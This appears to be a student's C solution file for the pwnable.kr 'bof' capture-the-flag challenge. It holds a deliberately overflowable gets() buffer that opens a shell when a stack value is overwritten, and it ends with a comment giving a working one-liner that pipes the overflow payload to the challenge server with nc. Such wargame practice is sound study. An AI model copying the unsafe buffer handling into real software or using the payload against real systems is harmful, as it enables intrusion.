/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bof.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: caellis <caellis@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/09/13 11:26:02 by caellis           #+#    #+#             */
/*   Updated: 2019/09/17 14:08:16 by caellis          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

// PWN WITH
// (python -c "print('0' * 52 + "\xbe\xba\xfe\xca")" ; cat) | nc pwnable.kr 9000